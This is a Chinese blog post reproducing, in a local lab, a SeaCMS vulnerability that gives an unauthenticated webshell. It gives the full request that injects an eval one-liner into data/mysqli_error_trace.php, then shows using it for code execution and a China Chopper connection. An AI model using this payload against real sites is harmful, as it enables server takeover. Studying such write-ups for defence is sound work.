---
title: seacms前台getshell
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: 7e4585bd
date: 2020-06-11 11:48:38
---
**0x01 简介**

海洋影视管理系统（seacms，海洋cms）海洋cms是基于PHP+MySql技术开发的开源CMS，是一套专为不同需求的站长而设计的视频点播系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选。

**0x02 环境搭建**  
使用phpstudy进行搭建。将整个upload上传到phpstudy目录下的www目录。将upload更改为seacms。  
http://xxx.xxx.xxx.xxx/seacms/install/index.php进行安装。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611113852584.png)  
安装成功后访问前台界面  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611113939192.png)

**0x03 漏洞触发位置**

    
    
    ：/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[a]);?%3E
    

写入php代码执行一句话木马

url地址：

    
    
    http://192.168.124.128/seacms//comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[a]);?%3E
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611114215519.png)  
写入的地址为 ` data/mysqli_error_trace.php `

访问写入的代码执行木马：

    
    
    http://192.168.124.128/seacms//data/mysqli_error_trace.php?a=phpinfo();
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061111440522.png)  
写入getshell一句话木马

    
    
    /data/mysqli_error_trace.php?a=@eval($_POST['a']);
    
    
    
    
    http://192.168.124.128/seacms//data/mysqli_error_trace.php?a=@eval($_POST[%27a%27]);
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611114641137.png)
上菜刀连接  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611114728362.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200611114820991.png)

